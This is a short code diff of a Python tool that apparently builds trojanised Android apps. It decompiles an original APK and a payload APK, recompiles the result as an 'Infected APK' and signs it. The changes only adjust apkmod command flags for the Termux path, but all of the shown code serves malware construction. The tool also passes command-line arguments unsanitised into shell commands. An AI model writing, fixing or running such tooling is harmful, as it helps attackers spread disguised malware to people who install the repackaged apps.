@@ -247,8 +247,8 @@ def Bind():
 		print_status("Decompiling APKs...\n")
 		os.chdir("TempP/")
 		if Termux_Bool:
-			os.system('apkmod -d %s %s' % (original,original.replace('.apk','')))
-			os.system('apkmod -d %s %s' % (payload,payload.replace('.apk','')))
+			os.system('apkmod -d %s -o %s' % (original,original.replace('.apk','')))
+			os.system('apkmod -d %s -o %s' % (payload,payload.replace('.apk','')))
 		else:
 			os.system('apktool d -f %s' % (original))
 			os.system('apktool d -f %s' % (payload))
@@ -331,7 +331,7 @@ def Bind():
 		print_status('Compiling Infected APK...\n')
 
 		if Termux_Bool:
-			subprocess.call("apkmod -r %s fin_out.apk" % (original.replace('.apk','')),shell=True)
+			subprocess.call("apkmod -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
 			os.chdir('../')
 		else:
 			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(sys.argv[3])),shell=True)
@@ -339,7 +339,7 @@ def Bind():
 			os.chdir('../')
 		print_status('Signing Infected APK...\n')
 		if Termux_Bool:
-			subprocess.call("apkmod -s TempP/fin_out.apk %s" % (str(sys.argv[3])),shell=True)
+			subprocess.call("apkmod -s TempP/fin_out.apk -o %s" % (str(sys.argv[3])),shell=True)
 			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
 			subprocess.call(rm + " TempP",shell=True)
 			exit()
